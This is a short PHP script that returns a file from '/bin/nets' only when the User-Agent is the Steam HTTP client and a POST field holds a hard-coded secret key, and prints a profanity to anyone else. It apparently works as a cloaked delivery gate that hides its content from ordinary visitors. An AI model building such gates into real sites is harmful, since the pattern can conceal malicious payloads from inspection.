<?php
$request = $_POST['A0791AfFA0F30EdCee1EdADb'];

if($_SERVER['HTTP_USER_AGENT']=="Valve/Steam HTTP Client 1.0 (4000)") { 
    if($request == "02C2C6A1Ded7183AeDAA8650") { 
        echo file_get_contents($_SERVER['DOCUMENT_ROOT'].'/bin/nets');
    }
}
else { 
    echo fuckoff;
}

?>